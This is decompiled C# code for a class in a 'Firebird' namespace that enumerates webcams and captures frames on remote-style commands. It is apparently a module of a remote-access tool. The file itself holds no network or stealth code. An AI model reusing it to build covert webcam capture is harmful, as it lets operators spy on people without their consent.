using System;
using System.Collections.Generic;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;

namespace Firebird
{
	// Token: 0x02000002 RID: 2
	public static class CommandHandler
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static Dictionary<string, List<Size>> HandleGetWebcams()
		{
			Dictionary<string, List<Size>> dictionary = new Dictionary<string, List<Size>>();
			foreach (object obj in new FilterInfoCollection(FilterCategory.VideoInputDevice))
			{
				FilterInfo filterInfo = (FilterInfo)obj;
				List<Size> list = new List<Size>();
				foreach (VideoCapabilities videoCapabilities2 in new VideoCaptureDevice(filterInfo.MonikerString).VideoCapabilities)
				{
					list.Add(videoCapabilities2.FrameSize);
				}
				dictionary.Add(filterInfo.Name, list);
			}
			if (dictionary.Count > 0)
			{
				return dictionary;
			}
			return null;
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002108 File Offset: 0x00000308
		public static void HandleGetWebcam(int cam, int res)
		{
			CommandHandler.NeedsCapture = true;
			CommandHandler.Webcam = cam;
			CommandHandler.Resolution = res;
			if (!CommandHandler.WebcamStarted)
			{
				CommandHandler.FinalVideo = new VideoCaptureDevice(new FilterInfoCollection(FilterCategory.VideoInputDevice)[cam].MonikerString);
				CommandHandler.FinalVideo.NewFrame += CommandHandler.FinalVideo_NewFrame;
				CommandHandler.FinalVideo.VideoResolution = CommandHandler.FinalVideo.VideoCapabilities[0];
				CommandHandler.FinalVideo.Start();
				CommandHandler.WebcamStarted = true;
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002189 File Offset: 0x00000389
		public static void HandleDoWebcamStop()
		{
			CommandHandler.NeedsCapture = false;
			CommandHandler.WebcamStarted = false;
			if (CommandHandler.FinalVideo != null)
			{
				CommandHandler.FinalVideo.NewFrame -= CommandHandler.FinalVideo_NewFrame;
				CommandHandler.FinalVideo.Stop1();
				CommandHandler.FinalVideo = null;
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021C4 File Offset: 0x000003C4
		private static void FinalVideo_NewFrame(object sender, NewFrameEventArgs e)
		{
			if (!CommandHandler.WebcamStarted)
			{
				CommandHandler.FinalVideo.Stop1();
			}
			if (CommandHandler.NeedsCapture)
			{
				CommandHandler.image = (Bitmap)e.Frame.Clone();
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000021F3 File Offset: 0x000003F3
		public static Bitmap ReturnCamImage()
		{
			return CommandHandler.image;
		}

		// Token: 0x04000001 RID: 1
		public static bool WebcamStarted;

		// Token: 0x04000002 RID: 2
		public static bool NeedsCapture;

		// Token: 0x04000003 RID: 3
		public static int Webcam;

		// Token: 0x04000004 RID: 4
		public static int Resolution;

		// Token: 0x04000005 RID: 5
		public static VideoCaptureDevice FinalVideo;

		// Token: 0x04000006 RID: 6
		public static Bitmap image;
	}
}
